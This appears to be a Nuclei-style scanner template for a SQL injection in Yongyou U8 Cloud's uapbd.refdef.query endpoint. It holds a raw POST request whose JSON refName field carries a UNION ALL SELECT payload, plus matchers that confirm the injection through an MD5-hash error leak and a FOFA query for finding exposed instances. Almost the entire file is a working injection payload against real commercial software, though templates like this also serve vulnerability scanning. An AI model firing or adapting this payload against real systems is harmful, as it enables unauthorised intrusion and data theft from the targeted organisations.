id: poc-yaml-yongyou-u8-cloud-uapbd-refdef-query-sqli
info:
  name: Yongyou U8 Cloud uapbd.refdef.query SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: Yongyou U8 Cloud
    fofa: app="用友-U8-Cloud"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"refName":"1%' UNION ALL SELECT 1,CONVERT(INT,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))),1-- "}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "转换成数据类型 int 时失败"
          - "U8C返回信息"
          - "0x{{t2}}"
        condition: and
